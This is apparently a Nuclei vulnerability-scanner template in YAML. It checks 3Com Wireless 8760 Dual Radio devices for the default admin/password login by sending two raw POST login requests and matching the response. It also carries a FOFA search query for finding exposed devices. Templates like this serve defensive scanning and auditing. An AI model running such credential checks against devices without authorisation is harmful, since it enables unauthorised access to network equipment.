http:
- attack: pitchfork
  matchers:
  - condition: and
    part: body
    type: word
    words:
    - alt="Advanced Configuration"
    - image/setup_wizard
  - status:
    - 200
    type: status
  matchers-condition: and
  payloads:
    password:
    - password
    username:
    - admin
  raw:
  - 'POST /index.htm HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    userid={{username}}&passwd={{password}}&Submit=LOGIN

    '
  - 'POST /login.html HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    username={{username}}&password={{password}}

    '
  stop-at-first-match: true
id: 3Com-wireless-default-login
info:
  author: ritikchaddha
  description: '3COM Wireless 8760 Dual Radio contains a default login vulnerability.
    Default admin login password ''password'' was found.

    '
  metadata:
    fofa-query: title="3COM"
    max-request: 2
  name: 3Com Wireless 8760 Dual Radio - Default Login
  reference:
  - https://www.speedguide.net/routers/3com-wl-546-3com-wireless-8760-dual-radio-11abg-1256
  severity: high
  tags: default-login,3com,vuln
